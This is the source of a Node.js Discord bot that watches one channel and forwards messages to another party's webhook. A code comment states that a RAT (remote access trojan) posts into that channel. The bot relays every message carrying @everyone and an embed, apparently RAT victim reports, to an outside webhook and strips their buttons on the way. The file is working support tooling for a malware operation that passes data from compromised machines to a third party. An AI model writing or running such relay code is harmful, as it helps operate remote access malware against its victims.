require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');
const axios = require('axios');

console.log('🤖 Discord Webhook Forwarder Starting...');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.on('ready', () => {
    console.log(`✅ Bot logged in as: ${client.user.tag}`);
    
    const channel = client.channels.cache.get(process.env.YOUR_CHANNEL_ID);
    if (channel) {
        console.log(`📺 Monitoring: #${channel.name} in ${channel.guild.name}`);
    } else {
        console.log(`❌ Channel ${process.env.YOUR_CHANNEL_ID} not found!`);
    }
});

client.on('messageCreate', async (message) => {
    // Only listen to your specific channel
    if (message.channelId !== process.env.YOUR_CHANNEL_ID) return;
    
    console.log(`\n📨 Message detected in #${message.channel.name}:`);
    console.log(`   Author: ${message.author.tag} (${message.author.id})`);
    console.log(`   Webhook: ${message.webhookId ? 'YES' : 'NO'}`);
    console.log(`   Content: ${message.content?.substring(0, 100) || '(no content)'}`);
    console.log(`   Embeds: ${message.embeds.length}`);
    
    // IMPORTANT: Webhook messages come from "bots" - DO NOT skip them!
    // The RAT sends messages via webhook, which appear as bot messages
    
    // Check if has @everyone AND embeds
    if (message.content?.includes('@everyone') && message.embeds.length > 0) {
        console.log('🎯 Forwarding @everyone + first embed...');
        
        // Get first embed
        const firstEmbed = message.embeds[0];
        
        // Create payload for his webhook
        const payload = {
            content: message.content,
            username: message.author.username,
            avatar_url: message.author.displayAvatarURL({ extension: 'png', size: 256 }),
            embeds: [firstEmbed.toJSON()]
        };
        
        // Remove any buttons/components from his embed
        if (payload.embeds[0].components) {
            delete payload.embeds[0].components;
            console.log('🗑️ Removed buttons/components');
        }
        
        // Send to his webhook
        try {
            await axios.post(process.env.HIS_WEBHOOK, payload);
            console.log('✅ Forwarded to his webhook!');
        } catch (error) {
            console.log('❌ Failed to forward:', error.message);
        }
    } else {
        console.log('⏭️ Skipping (no @everyone or no embeds)');
    }
});

client.on('error', console.error);
client.on('warn', console.warn);

// Login
client.login(process.env.BOT_TOKEN).catch(error => {
    console.log('❌ Login failed:', error.message);
});
